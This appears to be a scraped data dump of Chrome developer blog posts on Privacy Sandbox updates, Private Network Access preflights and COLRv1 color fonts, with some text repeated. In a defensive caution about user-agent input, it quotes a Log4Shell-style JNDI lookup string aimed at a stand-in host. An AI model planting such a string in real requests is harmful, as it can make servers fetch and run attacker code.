Instead, we'll look back at some of\nthe activities over 2021 and provide a few potential resolutions you can make\nnow we are in the new year.\n# Chromium development process\nFor a new web platform feature to land in Chromium, it needs to go through the\nproject's open development\nprocess.

Developers can sign up for the origin\ntrial of a feature, and then test it in production.\nIt's called an experiment because we have specific aspects of the feature we\nwant to validate in real-world environments. Developers that can test and\nshare the results of those tests provide valuable feedback to help iterate and\nevolve the feature.\nAn Intent to Ship is the final milestone which signals that a feature is now\ncomplete and ready for general availability. Once approved, the feature is\nmerged into an upcoming release and then progresses through the Canary, Beta,\nand Stable channels. It's critical to ensure you test your sites with the\nCanary and\nBeta versions of Chrome to catch and\nreport any bugs before a feature reaches Stable.\n# Proposals\nEach Privacy Sandbox proposal has an accompanying GitHub repository. A\nrepository hosts an explainer to summarize overall functionality, a detailed\nspecification for implementation by browsers, and contributions from across the\nweb ecosystem in the form of Issues and Pull Requests.\nAcross 14 Privacy Sandbox repositories, we had:\n\n  \n    💬545Issues created\n                           250Issues closed\n    🛠️261Pull Requests created\n                           223Pull Requests merged\n  \n  \n    Source\n  \n\nThe language in explainers and specifications is often targeted to an audience\nalready familiar with standards and browser development, which can be\nchallenging if you're unfamiliar with it. However, the aim of an explainer is to\nexplain! If there are points that are unclear or not covered, we want you to\nraise an Issue so we can update and clarify the explainer.\n# Resolutions\n# User-agent spring cleaning\nAs we were counting down to the New Year, we're also counting up to both\nChrome 100 and the incremental reduction\nof the user-agent string. This is a good\nmotivator to revisit any usage of the user-agent string in your code to check if\nit's affected by either of these changes.\nTo find those areas:\n\nSearch for navigator.userAgent in your JavaScript code, or access to the\nUser-Agent header in your server code.\nCheck your parsing of the string for assumptions about a 2 digit version. For\nexample, a regex that specifies \\d\\d or \\d{2} should be replaced with\n\\d+.\nCheck your use of the string for anywhere you rely on the:\n\nplatform (operating system) version\nfull Chrome build version\nmobile device name\n\n\nThese are the values that will be reduced to fixed strings in the future. If\nyou need access to these values, migrate to User-Agent Client\nHints.\n\nThere is one December update to mention—if you are adopting User-Agent Client\nHints, we have sent the Intent to Ship to enable delegating hints to other\norigins in\nHTML\nvia a <meta> tag. For example:\n<meta name=\"accept-ch\" content=\"sec-ch-ua-model=( https://foo.bar )\">\nIf you're in an enthusiastic spring cleaning mood, you can also consider\nalternatives to the use of user-agent altogether. If you're using the string to\ndetect mobile devices, then investigate if you can replace this with responsive\ndesign. If you're checking the browser name and version for feature support, see\nif you can use feature detection instead.\nIt's always worth remembering that the user-agent, like any client provided\nvalue, is not guaranteed to be accurate or even provided. The recent Log4j\nvulnerability, \"Log4shell\"\nprovides an example of this risk. A client that sets its user-agent string to\ninclude a value like ${jndi:ldap://example.com/file} may be able to get a site\nto actively parse that on the server.\nCaution\nIt's critical that you treat user-agent in the same way as any other form of\nuser input: sanitize and validate it before acting on the value.\n\n# Cookie cataloguing\nAnother traditional new year activity is to make sure you're happy that you have\na healthy number of cookies with quality ingredients. As we continue moving\ntowards the phase out of third-party cookies, you should make sure you know\nwhich of your site's cookies will be affected. 2020 provided a headstart as it\nbecame necessary to mark all cookies for cross-site or third-party\nuse\nwith SameSite=None.\nAny cookie where you have set the SameSite attribute to None will need an\nupdate.\nThere are three possible routes to consider at the moment:\n\nIf the cookie is only required in a 1:1 relationship with the top-level site,\nthen follow the progress of the CHIPS\nproposal. This will mean adding the\nPartitioned attribute to the cookie.\nIf the cookie is used in a cross-site context, but only across sites that you\nown and operate, then it may be a candidate for First-Party\nSets. This requires defining the\nsites in the set and adding the SameParty attribute to the cookie.\nIf the cookie is used to provide some form of shared value across multiple\nsites, investigate the wider set of Privacy Sandbox\nproposals for an alternative solution that does not\nrely on cross-site tracking.\n\nIf you're feeling especially health-conscious, then this is also an ideal time\nto revisit all of your cookie usage, as we have a good recipe to improve your\nfirst-party cookies too.\n\n  \n\n# Feedback\nAs we continue to publish these monthly updates, and progress through the\nPrivacy Sandbox as a whole, we want to make sure that developers receive the\ninformation and support that they need. Let us know on @ChromiumDev\nTwitter if there's anything that we could\nimprove in this series. We'll use your input to continue improving the format.\nCheck out the Privacy Sandbox FAQ, which we\ncontinue to expand based on the issues you submit to the developer support\nrepo. If you\nhave any questions around testing or implementation on any of the proposals,\ncome talk to us there.",

This is also where coding begins, which means you can expect the\nprototype functionality to be made available for developer testing behind a\nfeature\nflag.\nInitial feedback is critical for validating and iterating on proposals.\nAn Intent to Experiment is an optional step if we’d like to request an\norigin trial. Developers can sign up for the origin\ntrial of a feature, and then test it in production.\nIt's called an experiment because we have specific aspects of the feature we\nwant to validate in real-world environments. Developers that can test and\nshare the results of those tests provide valuable feedback to help iterate and\nevolve the feature.\nAn Intent to Ship is the final milestone which signals that a feature is now\ncomplete and ready for general availability. Once approved, the feature is\nmerged into an upcoming release and then progresses through the Canary, Beta,\nand Stable channels. It's critical to ensure you test your sites with the\nCanary and\nBeta versions of Chrome to catch and\nreport any bugs before a feature reaches Stable.\n# Proposals\nEach Privacy Sandbox proposal has an accompanying GitHub repository. A\nrepository hosts an explainer to summarize overall functionality, a detailed\nspecification for implementation by browsers, and contributions from across the\nweb ecosystem in the form of Issues and Pull Requests.\nAcross 14 Privacy Sandbox repositories, we had:\n\n  \n    💬545Issues created\n                           250Issues closed\n    🛠️261Pull Requests created\n                           223Pull Requests merged\n  \n  \n    Source\n  \n\nThe language in explainers and specifications is often targeted to an audience\nalready familiar with standards and browser development, which can be\nchallenging if you're unfamiliar with it. However, the aim of an explainer is to\nexplain! If there are points that are unclear or not covered, we want you to\nraise an Issue so we can update and clarify the explainer.\n# Resolutions\n# User-agent spring cleaning\nAs we were counting down to the New Year, we're also counting up to both\nChrome 100 and the incremental reduction\nof the user-agent string. This is a good\nmotivator to revisit any usage of the user-agent string in your code to check if\nit's affected by either of these changes.\nTo find those areas:\n\nSearch for navigator.userAgent in your JavaScript code, or access to the\nUser-Agent header in your server code.\nCheck your parsing of the string for assumptions about a 2 digit version. For\nexample, a regex that specifies \\d\\d or \\d{2} should be replaced with\n\\d+.\nCheck your use of the string for anywhere you rely on the:\n\nplatform (operating system) version\nfull Chrome build version\nmobile device name\n\n\nThese are the values that will be reduced to fixed strings in the future. If\nyou need access to these values, migrate to User-Agent Client\nHints.\n\nThere is one December update to mention—if you are adopting User-Agent Client\nHints, we have sent the Intent to Ship to enable delegating hints to other\norigins in\nHTML\nvia a <meta> tag. For example:\n<meta name=\"accept-ch\" content=\"sec-ch-ua-model=( https://foo.bar )\">\nIf you're in an enthusiastic spring cleaning mood, you can also consider\nalternatives to the use of user-agent altogether. If you're using the string to\ndetect mobile devices, then investigate if you can replace this with responsive\ndesign. If you're checking the browser name and version for feature support, see\nif you can use feature detection instead.\nIt's always worth remembering that the user-agent, like any client provided\nvalue, is not guaranteed to be accurate or even provided. The recent Log4j\nvulnerability, \"Log4shell\"\nprovides an example of this risk. A client that sets its user-agent string to\ninclude a value like ${jndi:ldap://example.com/file} may be able to get a site\nto actively parse that on the server.\nCaution\nIt's critical that you treat user-agent in the same way as any other form of\nuser input: sanitize and validate it before acting on the value.\n\n# Cookie cataloguing\nAnother traditional new year activity is to make sure you're happy that you have\na healthy number of cookies with quality ingredients. As we continue moving\ntowards the phase out of third-party cookies, you should make sure you know\nwhich of your site's cookies will be affected. 2020 provided a headstart as it\nbecame necessary to mark all cookies for cross-site or third-party\nuse\nwith SameSite=None.\nAny cookie where you have set the SameSite attribute to None will need an\nupdate.\nThere are three possible routes to consider at the moment:\n\nIf the cookie is only required in a 1:1 relationship with the top-level site,\nthen follow the progress of the CHIPS\nproposal. This will mean adding the\nPartitioned attribute to the cookie.\nIf the cookie is used in a cross-site context, but only across sites that you\nown and operate, then it may be a candidate for First-Party\nSets. This requires defining the\nsites in the set and adding the SameParty attribute to the cookie.\nIf the cookie is used to provide some form of shared value across multiple\nsites, investigate the wider set of Privacy Sandbox\nproposals for an alternative solution that does not\nrely on cross-site tracking.\n\nIf you're feeling especially health-conscious, then this is also an ideal time\nto revisit all of your cookie usage, as we have a good recipe to improve your\nfirst-party cookies too.\n\n  \n\n# Feedback\nAs we continue to publish these monthly updates, and progress through the\nPrivacy Sandbox as a whole, we want to make sure that developers receive the\ninformation and support that they need. Let us know on @ChromiumDev\nTwitter if there's anything that we could\nimprove in this series. We'll use your input to continue improving the format.\nCheck out the Privacy Sandbox FAQ, which we\ncontinue to expand based on the issues you submit to the developer support\nrepo. If you\nhave any questions around testing or implementation on any of the proposals,\ncome talk to us there.",

      "title": "Private Network Access: introducing preflights",
      "summary": "# Introduction\nChrome is deprecating direct access to private network endpoints from public\nwebsites as part of the\nPrivate Network Access (PNA)\nspecification.\nChrome will start sending a CORS preflight request ahead of any private\nnetwork request for a subresource, which asks\nfor explicit permission from the target server. This preflight request will\ncarry a new header, Access-Control-Request-Private-Network: true, and the\nresponse to it must carry a corresponding header,\nAccess-Control-Allow-Private-Network: true.\nThe aim is to protect users from cross-site request forgery (CSRF) attacks\ntargeting routers and other devices on private networks. These attacks have\naffected hundreds of thousands of users,\nallowing attackers to redirect them to malicious servers.\n# Rollout plan\nChrome will roll this change out in two phases to give websites time to notice\nthe change and adjust accordingly.\n\nIn Chrome 98:\n\nChrome sends preflight requests ahead of private network subresource\nrequests.\nPreflight failures only display warnings in DevTools, without otherwise\naffecting the private network requests.\nChrome gathers compatibility data and reaches out to the largest\naffected websites.\nWe expect this to be broadly compatible with existing websites.\n\n\nIn Chrome 101 at the earliest:\n\nThis will begin only if and when compatibility data indicates that the\nchange is safe enough and we've outreached directly when necessary.\nChrome enforces that preflight requests must succeed, otherwise failing\nthe requests.\nA deprecation trial starts at\nthe same time to allow for websites affected by this phase to request a\ntime extension. The trial will last for at least 6 months.\n\n\n\n# What is Private Network Access (PNA)\nPrivate Network Access\n(formerly known as CORS-RFC1918)\nrestricts the ability of websites to send requests to servers on private\nnetworks.\nChrome has already implemented part of the specification: as of Chrome 96, only\nsecure contexts are allowed to make private network requests. Refer to our\nprevious blog post for details.\nThe specification also extends the Cross-Origin Resource Sharing (CORS)\nprotocol so that websites must now explicitly request a grant from servers\non private networks before being allowed to send arbitrary requests.\nKey Term\nPrivate network requests are requests whose target server's IP address is\nmore private than that from which the request initiator was fetched. For example,\na request from a public website (https://example.com) to a private website\n(http://router.local), or a request from a private website to localhost.\n\n\n\n  \n    Relationship between public, private, local networks in Private Network\n    Access (CORS-RFC1918)\n  \n\nLearn more at Feedback wanted: CORS for private networks (RFC1918).\n# Preflight requests\n# Background\nPreflight requests are a mechanism introduced by the Cross-Origin Resource\nSharing (CORS) standard used\nto request permission from a target website before sending it an HTTP request\nthat might have side effects. This ensures that the target server understands\nthe CORS protocol and significantly reduces the risk of CSRF attacks.\nThe permission request is sent as an OPTIONS HTTP request with specific CORS\nrequest headers\ndescribing the upcoming HTTP request. The response must carry specific CORS\nresponse headers\nexplicitly agreeing to the upcoming request.\n\n# What's new in Private Network Access\nA new pair of request and response headers is introduced to preflight requests:\n\nAccess-Control-Request-Private-Network: true is set on all PNA preflight requests\nAccess-Control-Allow-Private-Network: true must be set on all PNA preflight responses\n\nPreflight requests for PNA are sent for all private network requests,\nregardless of request method and\nmode. They are sent\nahead of requests in cors mode as well as no-cors and all other modes. This\nis because all private network requests can be used for CSRF attacks,\nregardless of request mode and whether or not the response contents are made\navailable to the initiator.\n\nIf the private network request is made in cors mode, then CORS headers must\nbe set on the final response, in addition to the preflight response.\n\nPreflight requests for PNA are also sent for same-origin requests, if the\ntarget IP address is more private than the initiator. This is unlike regular\nCORS, where preflight requests are only for cross-origin requests. Preflight\nrequests for same-origin requests guard against\nDNS rebinding attacks.\n# Examples\nObservable behavior depends on the\nrequest's mode.\n# No-CORS mode\nSay https://foo.example/index.html embeds\n<img src=\"https://bar.example/cat.gif\" alt=\"dancing cat\"/>, and\nbar.example resolves to 192.168.1.1, a private IP address according to\nRFC 1918.\nChrome first sends a preflight request:\nHTTP/1.1 OPTIONS /cat.gifOrigin: https://foo.exampleAccess-Control-Request-Private-Network: true\nFor this request to succeed, the server must respond with:\nHTTP/1.1 204 No ContentAccess-Control-Allow-Origin: https://foo.exampleAccess-Control-Allow-Private-Network: true\nWarning\nThe server can set Access-Control-Allow-Origin: *, though this is dangerous\nand discouraged. Private network resources should rarely be accessible to all\norigins, so think carefully about the risks involved in setting such a header.\n\nThen Chrome will send the actual request:\nHTTP/1.1 GET /cat.gif...\nTo which the server can respond normally.\n# CORS mode\nSay https://foo.example/index.html runs the following code:\nawait fetch('https://bar.example/delete-everything', {  method: 'PUT',  credentials: 'include',})\nAgain, say bar.example  resolves to 192.168.1.1.\nChrome first sends a preflight request:\nHTTP/1.1 OPTIONS /delete-everythingOrigin: https://foo.exampleAccess-Control-Request-Method: PUTAccess-Control-Request-Credentials: trueAccess-Control-Request-Private-Network: true\nFor this request to succeed, the server must respond with:\nHTTP/1.1 204 No ContentAccess-Control-Allow-Origin: https://foo.exampleAccess-Control-Allow-Methods: PUTAccess-Control-Allow-Credentials: trueAccess-Control-Allow-Private-Network: true\nThen Chrome will send the actual request:\nHTTP/1.1 PUT /delete-everythingOrigin: https://foo.example\nTo which the server can respond per usual CORS rules:\nHTTP/1.1 200 OKAccess-Control-Allow-Origin: https://foo.example\n# How to know if your website is affected\nStarting in Chrome 98, if a private network request is detected, a preflight\nrequest will be sent ahead of it. If this preflight request fails, the final\nrequest will still be sent, but a warning will be surfaced in the DevTools\nissues panel.\n\nAffected preflight requests can also be viewed and diagnosed in the network panel:\n\nTo review what happens if preflight success was enforced, you can\npass the following command-line argument,\nstarting in Chrome 98:\n--enable-features=PrivateNetworkAccessRespectPreflightResults\nAny failed preflight request will result in a failed fetch. This can allow you\nto test whether your website would work after the\nsecond phase of our rollout plan. Errors can be diagnosed in\nthe same way as warnings using the DevTools panels mentioned above.\n# What to do if your website is affected\nWhen this change rolls out in Chrome 98, it is not expected to break any\nwebsite. However, we strongly encourage you to update affected request paths to\nensure your website keeps running as expected.\nThere are two solutions available to you:\n\nHandle preflight requests on the server side\nDisable PNA checks with enterprise policies\n\n# Handle preflight requests server-side\nUpdate the target server of any affected fetches to handle PNA preflight\nrequests. First, implement support for standard CORS preflight requests on\naffected routes. Then add support for the two new response headers.\nWhen your server receives a preflight request (an OPTIONS request with CORS\nheaders), the server should check for the presence of an\nAccess-Control-Request-Private-Network: true header. If this header is\npresent on the request, the server should examine the Origin header and the\nrequest path along with any other relevant information (such as\nAccess-Control-Request-Headers) to ensure the request is safe to allow.\nTypically, you should allow access to a single origin under your control.\nWarning\nBeware of insecure (non-https) origins, as they are unauthenticated. An on-path\nattacker could masquerade as any such origin!\n\nOnce your server has decided to allow the request, it should respond\n204 No Content (or 200 OK) with the necessary CORS headers and the new PNA\nheader. These headers include Access-Control-Allow-Origin and\nAccess-Control-Allow-Private-Network: true, as well as others as needed.\nRefer to the examples for concrete scenarios.\n# Disable Private Network Access checks using enterprise policies\nIf you have administrative control over your users, you can disable Private\nNetwork Access checks using either of the following policies:\n\nInsecurePrivateNetworkRequestsAllowed\nInsecurePrivateNetworkRequestsAllowedForUrls\n\nFor more information, refer to Understand Chrome policy\nmanagement.\n# What's next\nNext up, Chrome will extend Private Network Access checks to cover\nweb workers:\ndedicated workers, shared workers and service workers. We're tentatively aiming\nfor Chrome 100 to begin showing warnings.\nThen, Chrome will extend Private Network Access checks to cover navigations,\nincluding iframes and popups. We're tentatively aiming for Chrome 102 to start\nshowing warnings.\nIn both cases, we will be proceeding cautiously with a similar phased rollout,\nin order to give web developers time to adjust and estimate compatibility risk.\n# Acknowledgements\nCover photo by Mark Olsen on\nUnsplash.",

      "content_text": "# Introduction\nChrome is deprecating direct access to private network endpoints from public\nwebsites as part of the\nPrivate Network Access (PNA)\nspecification.\nChrome will start sending a CORS preflight request ahead of any private\nnetwork request for a subresource, which asks\nfor explicit permission from the target server. This preflight request will\ncarry a new header, Access-Control-Request-Private-Network: true, and the\nresponse to it must carry a corresponding header,\nAccess-Control-Allow-Private-Network: true.\nThe aim is to protect users from cross-site request forgery (CSRF) attacks\ntargeting routers and other devices on private networks. These attacks have\naffected hundreds of thousands of users,\nallowing attackers to redirect them to malicious servers.\n# Rollout plan\nChrome will roll this change out in two phases to give websites time to notice\nthe change and adjust accordingly.\n\nIn Chrome 98:\n\nChrome sends preflight requests ahead of private network subresource\nrequests.\nPreflight failures only display warnings in DevTools, without otherwise\naffecting the private network requests.\nChrome gathers compatibility data and reaches out to the largest\naffected websites.\nWe expect this to be broadly compatible with existing websites.\n\n\nIn Chrome 101 at the earliest:\n\nThis will begin only if and when compatibility data indicates that the\nchange is safe enough and we've outreached directly when necessary.\nChrome enforces that preflight requests must succeed, otherwise failing\nthe requests.\nA deprecation trial starts at\nthe same time to allow for websites affected by this phase to request a\ntime extension. The trial will last for at least 6 months.\n\n\n\n# What is Private Network Access (PNA)\nPrivate Network Access\n(formerly known as CORS-RFC1918)\nrestricts the ability of websites to send requests to servers on private\nnetworks.\nChrome has already implemented part of the specification: as of Chrome 96, only\nsecure contexts are allowed to make private network requests. Refer to our\nprevious blog post for details.\nThe specification also extends the Cross-Origin Resource Sharing (CORS)\nprotocol so that websites must now explicitly request a grant from servers\non private networks before being allowed to send arbitrary requests.\nKey Term\nPrivate network requests are requests whose target server's IP address is\nmore private than that from which the request initiator was fetched. For example,\na request from a public website (https://example.com) to a private website\n(http://router.local), or a request from a private website to localhost.\n\n\n\n  \n    Relationship between public, private, local networks in Private Network\n    Access (CORS-RFC1918)\n  \n\nLearn more at Feedback wanted: CORS for private networks (RFC1918).\n# Preflight requests\n# Background\nPreflight requests are a mechanism introduced by the Cross-Origin Resource\nSharing (CORS) standard used\nto request permission from a target website before sending it an HTTP request\nthat might have side effects. This ensures that the target server understands\nthe CORS protocol and significantly reduces the risk of CSRF attacks.\nThe permission request is sent as an OPTIONS HTTP request with specific CORS\nrequest headers\ndescribing the upcoming HTTP request. The response must carry specific CORS\nresponse headers\nexplicitly agreeing to the upcoming request.\n\n# What's new in Private Network Access\nA new pair of request and response headers is introduced to preflight requests:\n\nAccess-Control-Request-Private-Network: true is set on all PNA preflight requests\nAccess-Control-Allow-Private-Network: true must be set on all PNA preflight responses\n\nPreflight requests for PNA are sent for all private network requests,\nregardless of request method and\nmode. They are sent\nahead of requests in cors mode as well as no-cors and all other modes. This\nis because all private network requests can be used for CSRF attacks,\nregardless of request mode and whether or not the response contents are made\navailable to the initiator.\n\nIf the private network request is made in cors mode, then CORS headers must\nbe set on the final response, in addition to the preflight response.\n\nPreflight requests for PNA are also sent for same-origin requests, if the\ntarget IP address is more private than the initiator. This is unlike regular\nCORS, where preflight requests are only for cross-origin requests. Preflight\nrequests for same-origin requests guard against\nDNS rebinding attacks.\n# Examples\nObservable behavior depends on the\nrequest's mode.\n# No-CORS mode\nSay https://foo.example/index.html embeds\n<img src=\"https://bar.example/cat.gif\" alt=\"dancing cat\"/>, and\nbar.example resolves to 192.168.1.1, a private IP address according to\nRFC 1918.\nChrome first sends a preflight request:\nHTTP/1.1 OPTIONS /cat.gifOrigin: https://foo.exampleAccess-Control-Request-Private-Network: true\nFor this request to succeed, the server must respond with:\nHTTP/1.1 204 No ContentAccess-Control-Allow-Origin: https://foo.exampleAccess-Control-Allow-Private-Network: true\nWarning\nThe server can set Access-Control-Allow-Origin: *, though this is dangerous\nand discouraged. Private network resources should rarely be accessible to all\norigins, so think carefully about the risks involved in setting such a header.\n\nThen Chrome will send the actual request:\nHTTP/1.1 GET /cat.gif...\nTo which the server can respond normally.\n# CORS mode\nSay https://foo.example/index.html runs the following code:\nawait fetch('https://bar.example/delete-everything', {  method: 'PUT',  credentials: 'include',})\nAgain, say bar.example  resolves to 192.168.1.1.\nChrome first sends a preflight request:\nHTTP/1.1 OPTIONS /delete-everythingOrigin: https://foo.exampleAccess-Control-Request-Method: PUTAccess-Control-Request-Credentials: trueAccess-Control-Request-Private-Network: true\nFor this request to succeed, the server must respond with:\nHTTP/1.1 204 No ContentAccess-Control-Allow-Origin: https://foo.exampleAccess-Control-Allow-Methods: PUTAccess-Control-Allow-Credentials: trueAccess-Control-Allow-Private-Network: true\nThen Chrome will send the actual request:\nHTTP/1.1 PUT /delete-everythingOrigin: https://foo.example\nTo which the server can respond per usual CORS rules:\nHTTP/1.1 200 OKAccess-Control-Allow-Origin: https://foo.example\n# How to know if your website is affected\nStarting in Chrome 98, if a private network request is detected, a preflight\nrequest will be sent ahead of it. If this preflight request fails, the final\nrequest will still be sent, but a warning will be surfaced in the DevTools\nissues panel.\n\nAffected preflight requests can also be viewed and diagnosed in the network panel:\n\nTo review what happens if preflight success was enforced, you can\npass the following command-line argument,\nstarting in Chrome 98:\n--enable-features=PrivateNetworkAccessRespectPreflightResults\nAny failed preflight request will result in a failed fetch. This can allow you\nto test whether your website would work after the\nsecond phase of our rollout plan. Errors can be diagnosed in\nthe same way as warnings using the DevTools panels mentioned above.\n# What to do if your website is affected\nWhen this change rolls out in Chrome 98, it is not expected to break any\nwebsite. However, we strongly encourage you to update affected request paths to\nensure your website keeps running as expected.\nThere are two solutions available to you:\n\nHandle preflight requests on the server side\nDisable PNA checks with enterprise policies\n\n# Handle preflight requests server-side\nUpdate the target server of any affected fetches to handle PNA preflight\nrequests. First, implement support for standard CORS preflight requests on\naffected routes. Then add support for the two new response headers.\nWhen your server receives a preflight request (an OPTIONS request with CORS\nheaders), the server should check for the presence of an\nAccess-Control-Request-Private-Network: true header. If this header is\npresent on the request, the server should examine the Origin header and the\nrequest path along with any other relevant information (such as\nAccess-Control-Request-Headers) to ensure the request is safe to allow.\nTypically, you should allow access to a single origin under your control.\nWarning\nBeware of insecure (non-https) origins, as they are unauthenticated. An on-path\nattacker could masquerade as any such origin!\n\nOnce your server has decided to allow the request, it should respond\n204 No Content (or 200 OK) with the necessary CORS headers and the new PNA\nheader. These headers include Access-Control-Allow-Origin and\nAccess-Control-Allow-Private-Network: true, as well as others as needed.\nRefer to the examples for concrete scenarios.\n# Disable Private Network Access checks using enterprise policies\nIf you have administrative control over your users, you can disable Private\nNetwork Access checks using either of the following policies:\n\nInsecurePrivateNetworkRequestsAllowed\nInsecurePrivateNetworkRequestsAllowedForUrls\n\nFor more information, refer to Understand Chrome policy\nmanagement.\n# What's next\nNext up, Chrome will extend Private Network Access checks to cover\nweb workers:\ndedicated workers, shared workers and service workers. We're tentatively aiming\nfor Chrome 100 to begin showing warnings.\nThen, Chrome will extend Private Network Access checks to cover navigations,\nincluding iframes and popups. We're tentatively aiming for Chrome 102 to start\nshowing warnings.\nIn both cases, we will be proceeding cautiously with a similar phased rollout,\nin order to give web developers time to adjust and estimate compatibility risk.\n# Acknowledgements\nCover photo by Mark Olsen on\nUnsplash.",

      "title": "COLRv1 Color Gradient Vector Fonts in Chrome 98",
      "summary": "Compact, compression-friendly, color vector fonts with all your favorite\ngradient flavors.\nIn Chrome 98, the Chrome and Fonts teams have added support for COLRv1, an\nevolution of the COLRv0 font format intended to make color fonts widespread by\nadding gradients, compositing and blending, and improved internal shape reuse\nfor crisp and compact font files that compress well.\n\nExamples in this blog post require a browser that supports\nCOLRv1 fonts. Try viewing this post in Chrome 98 or above.\n\n# Color now\nOn the web, text is generally drawn in a color specified in CSS. The font does\nnot define any particular color, it just indicates where pixels should be\nplaced. That's usually a good thing. CSS lets the author flexibly choose a\ncolor. However, sometimes a glyph contains multiple colors that together have\nmeaning. For example, this flag  with light blue, pink, and white stripes would not\nconvey the same meaning if it was simply drawn in the current text color.\nToday, for most users, emojis are the only color fonts they see. Emojis\ntypically appear on the web via the system emoji font, or by inserting images\n(which has its own complications, ). Large file\nsizes especially for bitmap-based color fonts have made it difficult to use web\nfonts for emoji. By supporting COLRv1, we hope to see a proliferation of\ncreative color font use on the web and beyond.\n# Show me your colors\nWe've created a couple of examples for you to play with:\n \n\n \n\n \n\nThe example assets from Google Fonts used in the example are live in the\nGoogle Fonts web API. They are\nnot listed in the directory at fonts.google.com as\nthey will only work on Chrome 98 or later and showcase experimental work.\nYou can now make your own COLRv1 fonts using free and open-source tools. Check\nout the nanoemoji font compiler\nwhich allows you to build COLRv1 fonts from SVG source images, then try them in\nChrome 98 or later. Try making your own spin on Bungee Spice by changing the\ngradient colors using\nthese instructions.\nFor example, you might modify the Bungee Spice font to have a blue and red gradient, like this:\n\nTweet your results to @googlefonts 🙂 Why not try a radial or sweep gradient?\n# New with COLRv1\nThe font format supports multiple ways to support color, all with different\ntradeoffs – but none have been successful on the web so far. (To learn more\nabout the tradeoffs,\ntake a look at Dominik's BlinkOn 15 conference talk.)\nChrome 98 brings support for COLRv1, an evolution of COLRv0. We hope that\nCOLRv1's combination of graphic capabilities and compact files will make it a\ngood choice for many color font use cases. COLRv1 adds gradients,\ncompositing, and blending, and improves\ninternal shape reuse to make even more compact files.\nCOLRv1 has expressive capability roughly equivalent to\nSVG Native plus\nblending and compositing added on\ntop. There are four types of color fills: solid colors, linear gradients, radial\ngradients, and sweep/conic gradients. COLRv1 lets you reposition and transform\nglyph elements using a full set of translate, rotate, sheer, and scale\ntransformations. Plus, it features support for font variations and reuses\nexisting shape definition formats in the font.\n  Shape reuse in the crystal ball\n    emoji \nThink about the crystal ball emoji as an example: The star-shaped highlights are\nthe same shape but different sizes, which means just one shape can be\nrepositioned and reused without duplication inside the file. The format allows\nyou to reuse a full glyph within a new glyph, without having to redundantly\nencode the same shapes for each glyph. Imagine a decorative color font with\nfloral decorations, where the same flower shapes are placed on different letters\nby just referencing existing color glyphs. For the web font use case, COLRv1\ncompresses well under woff2. For example, a test build of Twemoji using COLRv1\ntakes about 1.2 MB inflated, but is about 0.6MB in woff2 form. A build of the\nfull Noto Emoji Glyph set is reduced from 9MB for the bitmap version to 1.85MB\nin COLRv1+woff2 form.\n\n\nNoto Emoji font size CBDT/CBLC vs. COLRv1 after WOFF2 compression.\n\n\n# Color font use cases\n# Catchy headlines\nA fresh color font makes visual highlights, headlines, and banners really pop\nout.\n  \n\nPlakato Color Happy\n2022 featuring energetic sweep gradients, made by the innovative type\nfoundry Underware (Twitter: @underware, Instagram: @underwarefoundry). Read\nmore about Underware’s first COLRv1 release in their blog post.\n \n# No more image replacement: emoji fonts\nIf you support user generated content, your users probably use emojis. Today\nit's very common to scan text and replace any emoji encountered with images to\nensure consistent cross-platform rendering and the ability to support newer\nemojis than the OS supports. Those images then have to be switched back to text\nduring clipboard operations. Here's a real example:\n\n\nImage replacement in Google Chat\n\nIf you have an emoji font you just render the text in the font, like this:\n<style>@import url(https://fonts.googleapis.com/css2?family=Noto+Color+Emoji);.emoji {  font-family: \"Noto Color Emoji\", sans-serif;}</style><span class=\"emoji\">🙂</span>\nSimilarly, in an emoji reaction component, COLRv1 offers the opportunity to use\na compact font file instead of a catalog of image assets.\n  Emoji\nReaction Picker on GitHub \nImagine how many images you'd have to fetch for a complete emoji picker!\n# Color in icon fonts\nUsing color in icon fonts adds clarity and makes glyphs easier to understand.\n  \nMaterial two-tone icons from https://fonts.google.com/icons\n \n# Artistic expression\nSpace-efficient color fonts enable new forms of artistic expression in text on\nthe web. This example of a Kufi-style Arabic font uses color gradients as an\nartistic interpretation of what the ink flow of traditional calligraphy could\nlook like when applied to the Kufi style of Arabic writing, which originates\nfrom not being written with nib and ink but carved in stone.\n\nReem Kufi Ink,\nan Arabic font by Khaled Hosny \n# Feature detection\nAt the moment, figuring out whether a browser engine supports a specific color\nfont format is possible by means of user-agent sniffing or by searching in a\nlibrary like ChromaCheck by\n@PixelAmbacht to test rendering of color\nglyphs on Canvas. Both solutions are not optimal. Feature testing should detect\nonly a specific feature itself and avoid user agent sniffing. The ChromaCheck\nlibrary should not need to perform resource-intensive 2D canvas operations for\ndetermining support.\nThe Chrome team wants to improve that and has started a series of discussions\n[1,\n2] in the CSS working group\nto provide information on browser font technology support in JavaScript and\ndeclaratively in CSS. The team plans to release efficient feature detection for\ncolor font and other font technologies in a future version of Chrome.\nIf you would like to use color fonts in your project right now when COLRv1\nsupport is limited to Chrome, there are two ways you can do that: Ask your font\nvendor for a COLRv1 font that contains monochrome glyphs too. User agents that\ndon’t support COLRv1 will fall back to rendering monochrome\nglyphs. Alternatively, you can use the ChromaCheck library or user agent\nsniffing to determine whether COLRv1 support is available. Then you deliver CSS\nthat loads COLRv1 fonts in supporting user agents and use an alternative font\nformat such as COLRv0, a bitmap font format or OpenType SVG in other browsers.\n# CSS font-palette support\nIt would be tremendously useful if using a different set of colors would not\nrequire a new font. Thankfully, a mechanism exists: the\nfont-palette CSS property. The\nChrome team is working on adding\nsupport for font-palette in Chrome.\n# COLRv1 fonts & you\nIf COLRv1 fonts piques your interest, ask your font vendor about a COLRv1 color\nfont to use in your project, try the examples and demos\nabove, or why not dive right in and experiment with\nmaking your own?\nIf you have feedback on COLRv1 in Chrome, post to the\nblink-dev mailing list,\nor file an issue in our issue tracker. If you have feedback\non the COLRv1 font format itself, file an issue at the\nCOLRv1 specification GitHub repository.\nWith Chrome 98, we’re excited about how COLRv1 brings a whole new level of\ntypographic creativity to the web.\n# Learn more\nIf you're interested in more details, we have a couple more resources for you:\nTo learn how COLRv1 works and how it's implemented in Chrome, check out Dominik's BlinkOn 15 conference talk.\n\n  \n\n\nInternational Unicode Conference #45: Vector Color Fonts, talk by Roderick\nSheeter, Peter Constable, and Dominik Röttsches\n(video,\ntalk details)\nnanoemoji font compiler, producing\nCOLRv1 fonts from SVG images\nGoogle Fonts’\ncolor-fonts GitHub repository\ncontaining current builds of Noto Emoji, Twemoji, and other sample fonts\nDJR's showcase of the Bradley Initials font, exploring COLRv1\nChromaCheck tool and library to\nfeature-detect available color font technologies\n\n# Acknowledgements\nMany thanks to Behdad Esfahbod, Cosimo Lupo, Peter Constable, Ben Wagner, Werner\nLemberg, Dave Crossland, Vladimir Levantovsky, 